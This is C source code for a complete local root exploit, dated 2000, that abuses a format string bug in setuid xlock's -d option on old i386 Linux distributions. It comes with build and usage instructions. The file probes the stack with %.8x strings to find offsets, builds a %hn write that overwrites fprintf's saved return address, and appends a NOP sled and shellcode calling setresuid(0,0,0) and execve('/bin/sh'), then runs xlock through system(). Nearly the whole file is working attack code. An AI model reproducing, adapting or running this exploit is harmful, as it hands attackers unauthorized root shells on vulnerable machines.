/*

Exploit for xlock -d format string bug on i386 Linux. 
By Ben Williams 21 Oct 2000.

Works on Slackware 7.1, Redhat 6.2 - did not have setuid though,  Mandrake 7.0.
Redhat 6.1 won't work because fprintf segfaults on large precisions.

gcc xlockfmt.c -o xlockfmt
usage: xlockfmt [offset]
Default offset is 48.

Program calcuates all variables such as target return address, shellcode address
and the format string itself. The only thing not calculated is an offset that is
dependant on the version of xlock or how xlock was compiled.
The target address is fprintf()'s saved return address. This equals the value of
openDisplay()'s saved base pointer less offset bytes. Shellcode is appended to
the format string.


Stack picture:
see resource.c, xlock.c 

 fprintf(stderr, buf) A-48| ret      | return address located at A - 48 bytes.
                          | stderr   |
                          | buf      |
           error(buf)     | bp  A    | first value printed by format string is A.
                          | ret      |
                          | buf      |
openDisplay(displayp)     | buf      |
                          | ?        |
                          | ?        |
                          | ?        |
                          | ?        |
                          | ?        |
                         A| bp       | base pointer located at address A.


*/ 

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <error.h>
#include <errno.h>
#include <sys/stat.h>
#include <unistd.h>

/* 
 * distance from fprintf's ret to openDisplay's base pointer 
 * redhat6.2, slackware7.1 = 48
 * mandrake7.0 = 60
 */
#define OFFSET 48

#define XLOCK_PATH "/usr/X11R6/bin/xlock"

#define DEBUG 0
#define FMTSIZE 4096
#define CMDSIZE FMTSIZE + 100

/* number of words to print off the stack for analysis */
#define BIGBREAKFAST 400


/* xlock drops privs right away so we have to restore them again.
   setresuid(0, 0, 0) then execve a shell */
char shellcode[] =
        "\x31\xd2\x31\xc9\x31\xdb\x31\xc0\xb0\xa4\xcd\x80" 
        "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
        "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
        "\x80\xe8\xdc\xff\xff\xff/bin/sh";


char *mkfmt(int prebuf,
           int breakfast,
           unsigned long int location,
           unsigned long int value);


int main(int argc, char **argv){
    FILE *fp;
    char output[65536];
    char fmtstr[FMTSIZE];
    char command[CMDSIZE];
    int i;
    char *p;
    int prebuf;
    int breakfast;
    unsigned long int location;
    unsigned long int value;
    int shellcode_size = sizeof shellcode;
    int offset = OFFSET;
    struct stat f;

    i = stat(XLOCK_PATH, &f);
    if (i) error(1, errno, "whereis xlock?");
    if (!(f.st_mode & S_IXOTH)) error(1, 0, "executable?");
    if (!(f.st_mode & S_ISUID)) error(1, 0, "not setuid");

    if (argc > 1) {
        offset = atoi(argv[1]);
    }

    /*
     * Setup a format string to analyse the stack.
     */
    
    memset(output, 0, 65536);
    memset(fmtstr, 0x20, FMTSIZE);

    for (i = 0, p = fmtstr; i < BIGBREAKFAST; i++) {    
        memcpy(p, "%.8x ", 5);
        p += 5;
    }

    /* 
     * blank out 10 bytes - the first two %.8x's.
     * this makes space for the prebuf bytes and token.
     */

    memset(fmtstr, 0x20, 10);   
    fmtstr[FMTSIZE - 1] = 0x00;
    
    /*
     *  Find the number of prebuf bytes (0x03's)to word align.        
     *  0 to 3 bytes may be needed to shove the token
     *  01010101 of the fmt str onto a word boundary.
     */

    i = 0;
    do {
        prebuf = i;
        memset(fmtstr, 0x03, i);  
        memset(fmtstr + i, 0x01, 4);
        sprintf(command, "%s -d '%s' 2>&1", XLOCK_PATH, fmtstr);
        fp = popen(command, "r");
        memset(output, 0, 65536);
        fread(output, 1024, 64, fp);
        fclose(fp);
#if DEBUG
        printf("======== trying prebuf %d =======\n%s", i, output);
#endif
        i++;
    } while (!strstr(output, "01010101") && i < 4); /* prebuf bytes always less than 4 */

    if (prebuf == 4){
        error(1, 0, "could not find fmt str on the stack");
    }


    memset(output, 0x20, 40);   /* clear the 'xlock: unable to open display' */
    p = strtok(output, "\x20"); /* get A */

    /*
     * Store error()'s base ptr value in var location.
     * Then find fprintf()'s ret by subracting offset.
     */

    location = strtoul(p, NULL, 16);
    location -= offset;
    value = location                /* fprintf's ret */
            + 12                    /* 3 words to error's bp */
            + breakfast * 4         /* breakfast words to fmt str */ 
            + FMTSIZE               /* to end of fmt str */
            - shellcode_size        /* to start of shellcode */
            - 100;                  /* position in the NOPS for safe measure */

    /*
     * Walk down the output string looking for 01010101,
     * counting how whole many words eaten to get there.
     */

    for (breakfast = 1; ; breakfast++) {
        p = strtok(NULL, "\x20");
        if (!p) error(1, 0, "reached end of output string and no 01010101");
#if DEBUG
        printf("eat %d to reach %s\n", breakfast, p);
#endif
        if (!strcmp(p, "01010101")) break;
    }


    /*
     * make the exploit fmt str.
     */

    p = mkfmt(prebuf, breakfast, location, value);
    memset(fmtstr, 0x90, FMTSIZE);
    memcpy(fmtstr, p, strlen(p));
    free(p);
    p = (char *) &fmtstr[FMTSIZE - shellcode_size];
    strcpy(p, shellcode);

    sprintf(command, "%s -d '%s'", XLOCK_PATH, fmtstr);

#if DEBUG
    puts("====== command line ======");
    printf("%s\n", command);
    puts("====== end command  ======");

#endif

    puts("====== system() ======");
    i = system(command);
    puts("====== end system ======");

    printf("\nsystem() returned %d\n", i);
    printf("prebuf was %d bytes\n", prebuf);
    printf("breakfast was %d words\n", breakfast);
    printf("location was %.8lx\n", location);
    printf("value was %.8lx\n", value);

    puts("exiting.");
    return 0;
}


/*
 * Function to generate a nasty format string.
 * MODIFIED FOR XLOCK EXPLOIT ONLY. 
 * breakfast - number of words to eat before reaching 01010101.
 * location - memory address to write to.
 * value - value to write.
 *
 * Resulting string looks something like this:
 *
 *      "\x03\x03\x03"          0 to 3 bytes used to align next value on a word boundary.
 *      "\x01\x01\x01\x01"      this must be aligned on a word boundary.
 *      "\xfc\xfa\xff\xbf"      first write address.
 *      "\x01\x01\x01\x01"
 *      "\xfe\xfa\xff\xbf"      second write address.
 *      "%.8x%.8x%.8x"          this example breakfast = 3.
 *      "%.45780lx"             this must write the first 01010101 
 *      "%hn"
 *      "%.3371lx"              writes the second 01010101
 *      "%hn"
 *      
 */

char *mkfmt(int prebuf,
            int breakfast,
            unsigned long int location,
            unsigned long int value)
{
    char *buf;
    unsigned long int dest_addr[2];
    unsigned int precision[2];
    unsigned int small;  /* small half of value */
    unsigned int big;    /* big half of value */
    char *p;
    int i;
    
    buf = (char *) malloc(200); 
    if (!buf) {
        error(1, errno, "failed to malloc");
    }
    
    big = value & 0x0000ffff;        /* grab the 2 low order bytes */
    small = (value & 0xffff0000) >> 16;   /* and the 2 high order */

    if (big < small) {
        big ^= small; small ^= big; big ^= small;
        dest_addr[0] = location;
        dest_addr[1] = location +2;
    }
    else {
        dest_addr[0] = location +2;
        dest_addr[1] = location;
    }

    p = buf;
    memset(p, 0x03, prebuf);
    p += prebuf;
    memcpy(p, "\x01\x01\x01\x01", 4);
    p += 4;
    memcpy(p, (char *)&dest_addr[0], 4);
    p += 4; 
    memcpy(p, "\x01\x01\x01\x01", 4);
    p += 4;
    memcpy(p, (char *)&dest_addr[1], 4);
    p += 4;

    for (i=0; i < breakfast; i++){
        memcpy(p, "%.8x", 4);
        p += 4;
    }

    /* the 30 chars are the 'xlock: unable to open...' */

    precision[0] = small - (8 * breakfast + 16 + prebuf + 30);
    precision[1] = big - small;    

#if DEBUG
    strcat(buf, "\nFirst print %.8x\n");
    strcat(buf, "First write %.8x\n");
    strcat(buf, "Second print %.8x\n");
    strcat(buf, "Second write %.8x\n");

#else
    sprintf(p, "%%.%dx%%hn%%.%dx%%hn", precision[0], precision[1]);

#endif
    return buf;

}
